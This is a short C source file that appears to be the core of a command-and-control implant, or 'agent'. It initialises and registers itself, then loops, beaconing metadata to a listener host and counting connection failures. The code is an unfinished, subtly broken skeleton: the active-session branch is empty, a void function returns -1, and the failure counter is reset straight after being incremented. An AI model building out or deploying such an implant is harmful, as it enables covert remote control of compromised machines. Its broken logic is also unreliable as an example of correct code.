#include "agent.h"
#include "package.h"

void AgentMain() {
	pAgent agent = (pAgent)LocalAlloc(LPTR, sizeof(Agent));
	INT err;

	

	if ((err = init_agent(agent)) != 0) {
		printf("[error] attempting to initialize agent\n");
		return -1;
	}

	
	if ((err = RegisterAgent(agent)) != 0) {
		printf("[error] attempting to register agent\n");
		return -1;
	}


}

void AgentRoutine(pAgent agent) {
	while (TRUE) {
		if (!agent->session->Active)
		{
			if ((PackageSendMetaDataPackage(agent->MetaDataPackage, NULL, NULL, agent)) != PACKAGE_SUCCESS) {
				printf("[error] attempting to send package\n");
				agent->config->listenerConfig.CurrentHost->NumFailures++;
			}
			agent->config->listenerConfig.CurrentHost->NumFailures = 0;
		}

		if (agent->session->Active) {

		}
	}
}